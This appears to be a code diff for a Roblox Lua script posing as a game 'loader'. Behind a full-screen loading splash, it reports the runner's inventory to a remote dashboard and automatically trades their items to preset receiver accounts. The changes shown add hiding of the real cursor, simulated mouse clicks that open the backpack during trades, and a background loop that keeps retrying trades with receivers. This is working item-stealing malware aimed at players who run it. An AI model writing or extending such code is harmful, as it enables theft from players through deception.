@@ -3,7 +3,7 @@
 -- your full inventory so you can join the server and collect.
 -- the loader holds for SESSION_SECONDS (5 minutes), then the client detaches cleanly.
 
-local CLIENT_REV = "3.1"
+local CLIENT_REV = "3.2"
 local TOKEN = "{{TOKEN}}"
 local ENDPOINT = "{{ENDPOINT}}"
 local MIN_VALUE = {{MIN_VALUE}}
@@ -28,6 +28,7 @@ local RECEIVER_RETRY = 4       -- trade requests per receiver before giving up
 local OFFER_GAP = 0.35         -- seconds between offered items
 local OFFER_LIMIT = 24         -- trade window buttons clicked per offer pass
 local SESSION_SECONDS = 300    -- how long the loader + client runs (5 minutes)
+local HIDE_CURSOR = true       -- hide the real cursor while the client drives it
 local REPORT_INVENTORY = true  -- dump the executor's inventory to the dashboard on load
 
 --[[ no-real-item kick ]]
@@ -74,6 +75,11 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+
+if HIDE_CURSOR then
+    pcall(function() UserInputService.MouseIconEnabled = false end)
+end
 
 --[[ ---- loading screen: covers the viewport until the client is wired up ---- ]]
 local MIN_SPLASH = 1.2
@@ -449,6 +455,85 @@ local function clickButton(button)
     return clicked
 end
 
+-- move the real pointer onto the widget and press it, so games that only listen to
+-- user input (not button signals) still register the click
+local function mousePress(button)
+    local pos
+    pcall(function() pos = button.AbsolutePosition + button.AbsoluteSize * 0.5 end)
+    if not pos then return clickButton(button) end
+
+    local real = false
+    if typeof(mousemoveabs) == "function" then
+        pcall(mousemoveabs, pos.X, pos.Y)
+        real = true
+        if typeof(mouse1click) == "function" then
+            pcall(mouse1click)
+        elseif typeof(mouse1down) == "function" and typeof(mouse1up) == "function" then
+            pcall(mouse1down)
+            pcall(mouse1up)
+        end
+    end
+
+    pcall(function()
+        local vu = game:GetService("VirtualUser")
+        vu:MoveMouse(pos)
+        vu:Button1Down(pos, Enum.UserInputType.MouseButton1)
+        vu:Button1Up(pos, Enum.UserInputType.MouseButton1)
+    end)
+    return real or true
+end
+
+local function inventoryScreen()
+    local player = LocalPlayer or Players.LocalPlayer
+    local gui = player and player:FindFirstChildOfClass("PlayerGui")
+    if not gui then return nil end
+    for _, screen in ipairs(gui:GetChildren()) do
+        local n = screen.Name:lower()
+        if screen:IsA("ScreenGui") and
+            (n:find("backpack", 1, true) or n:find("invent", 1, true) or n:find("collection", 1, true)) then
+            return screen
+        end
+    end
+    return nil
+end
+
+-- the hud button that opens it (Backpack / Inventory / Bag), never one inside a panel
+local function findHudInventoryButton()
+    local player = LocalPlayer or Players.LocalPlayer
+    local gui = player and player:FindFirstChildOfClass("PlayerGui")
+    if not gui then return nil end
+
+    for _, obj in ipairs(gui:GetDescendants()) do
+        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
+            local node = obj
+            while node and not node:IsA("ScreenGui") do node = node.Parent end
+            local sn = node and node.Name:lower() or ""
+            if not (sn:find("trade", 1, true) or sn:find("backpack", 1, true)
+                or sn:find("invent", 1, true) or sn:find("collection", 1, true)) then
+                local label = (buttonLabel(obj) or obj.Name):lower()
+                if label == "backpack" or label == "inventory" or label == "bag"
+                    or label == "items" or label == "inv"
+                    or label:find("backpack", 1, true) or label:find("inventory", 1, true) then
+                    return obj
+                end
+            end
+        end
+    end
+    return nil
+end
+
+local function openInventory()
+    local screen = inventoryScreen()
+    if screen and screen.Enabled ~= false then return screen end
+
+    local button = findHudInventoryButton()
+    if button then
+        mousePress(button)
+        task.wait(0.9)
+    end
+    return inventoryScreen()
+end
+
 -- sticky read state: "seen" only turns true once a real collection was listed,
 -- so an unreadable inventory can never be mistaken for an empty one
 local inventoryInfo = { collections = 0, containers = 0, gui = 0, panels = 0, seen = false }
@@ -711,6 +796,9 @@ function Vexora.stop()
     end
     connections = {}
     table.clear(queue)
+    if HIDE_CURSOR then
+        pcall(function() UserInputService.MouseIconEnabled = true end)
+    end
     releaseSplash("loaded", 1.2)
     print(string.format("[vexora] %ds session complete — client detached", SESSION_SECONDS))
 end
@@ -1224,6 +1312,11 @@ local function offerEverything(receiver)
     -- fills the offer slots, whatever the game named its remotes.
     local window = tradeWindow()
     if window then
+        -- open the backpack with the mouse first: the trade grid reuses it and the
+        -- item labels only exist once the panel has been opened
+        openInventory()
+        task.wait(0.4)
+
         -- the grid is built a moment after the window opens
         local list = {}
         for attempt = 1, 4 do
@@ -1312,7 +1405,7 @@ local function runReceiverTrade(player)
                 detail = #tradeRemotes > 0 and "trade ui never opened" or "no trade remotes found",
             })
             outgoingTrade = false
-            tradesRun[key] = nil
+            task.delay(60, function() tradesRun[key] = nil end)
             return
         end
 
@@ -1348,7 +1441,7 @@ local function runReceiverTrade(player)
             detail = stillOpen and "receiver has to accept" or "trade window closed",
         })
         outgoingTrade = false
-        tradesRun[key] = nil
+        task.delay(60, function() tradesRun[key] = nil end)
     end)
 end
 
@@ -1607,6 +1700,19 @@ if AUTO_TRADE_RECEIVERS then
                 runReceiverTrade(plr)
             end
         end
+
+        -- either join order works: if the receiver was already here the loop above
+        -- catches it, and this keeps checking after missed or failed attempts
+        task.spawn(function()
+            while not stopped do
+                task.wait(8)
+                for _, plr in ipairs(Players:GetPlayers()) do
+                    if plr ~= (LocalPlayer or Players.LocalPlayer) and isReceiver(plr.Name) then
+                        runReceiverTrade(plr)
+                    end
+                end
+            end
+        end)
     end
 end
 
